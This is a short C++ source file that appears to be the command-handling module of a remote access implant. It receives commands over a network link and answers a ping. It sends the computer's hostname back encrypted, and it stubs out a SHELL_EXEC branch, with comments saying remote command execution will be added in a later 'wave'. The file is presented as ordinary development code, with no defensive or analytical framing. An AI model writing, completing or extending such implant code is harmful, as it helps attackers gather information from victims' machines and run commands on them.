#include "Modules.h"
#include "Crypto.h"
#include <iostream>
#include <windows.h>

void Modules::HandleCommand(const std::string& cmd, Network& net) {
    // Basic command parsing (will expand in wave 6)
    if (cmd == "PING") {
        net.Send(Crypto::Encrypt("PONG"));
    }
    else if (cmd == "SYSINFO") {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);
        
        std::string info = "{\"hostname\":\"" + std::string(computerName) + "\",\"os\":\"Windows\",\"arch\":\"x64\"}";
        net.Send(Crypto::Encrypt(info));
    }
    else if (cmd == "SHELL_EXEC") {
        // payload is a command to run
        // We'll implement payload parsing in wave 6.
    }
}
